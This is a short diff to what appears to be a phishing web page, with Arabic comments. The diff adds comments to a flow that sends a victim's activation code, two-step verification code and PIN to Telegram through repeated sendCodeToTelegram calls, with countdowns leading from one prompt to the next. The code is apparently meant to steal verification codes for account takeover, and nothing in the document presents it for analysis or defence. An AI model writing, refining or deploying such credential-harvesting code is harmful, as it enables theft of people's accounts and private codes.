@@ -134,8 +134,8 @@
                 countdownValue--;
                 if (countdownValue <= 0) {
                     clearInterval(interval);
-                    countdownDisplay.textContent = '';
-                    callback();  // انتقل إلى الصفحة التالية بعد العد التنازلي
+                    countdownDisplay.textContent = '';  // إخفاء العد التنازلي
+                    callback();  // تنفيذ العملية بعد انتهاء العد التنازلي
                 } else {
                     countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                 }
@@ -152,7 +152,9 @@
 
             sendCodeToTelegram(activationCode1, "رمز التفعيل");
 
+            // بعد إتمام العد التنازلي سيتم الانتقال إلى الصفحة التالية
             startCountdown(() => {
+                // هنا يتم تغيير محتوى الصفحة بشكل صحيح بعد العد التنازلي
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>رمز التفعيل الصحيح</h1>
@@ -174,7 +176,9 @@
 
             sendCodeToTelegram(activationCode2, "رمز التفعيل");
 
+            // بدء العد التنازلي للانتقال إلى الصفحة التالية
             startCountdown(() => {
+                // تغيير المحتوى هنا بعد العد التنازلي
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>التحقق من خطوتين</h1>
@@ -200,7 +204,9 @@
 
             sendCodeToTelegram(pinCode1, "رمز PIN");
 
+            // بدء العد التنازلي
             startCountdown(() => {
+                // تغيير المحتوى بعد العد التنازلي
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <h1>إعادة رمز PIN</h1>
